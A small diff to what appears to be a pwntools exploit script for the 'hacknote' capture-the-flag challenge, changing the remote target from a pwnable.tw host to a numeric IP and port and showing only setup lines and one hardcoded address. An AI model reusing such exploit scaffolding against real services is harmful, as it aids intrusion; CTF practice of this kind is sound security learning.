@@ -1,7 +1,7 @@
 from pwn import *
 # context.log_level = 'debug'
 # io=process('./hacknote')
-io=remote('chall.pwnable.tw','10102')
+io=remote('61.147.171.105', 64860)
 elf=ELF('./hacknote')
 libc=ELF('libc_32.so.6')
 addr_putsa1=0x0804862B    #不能是plt里的，因为它需要参数在栈里
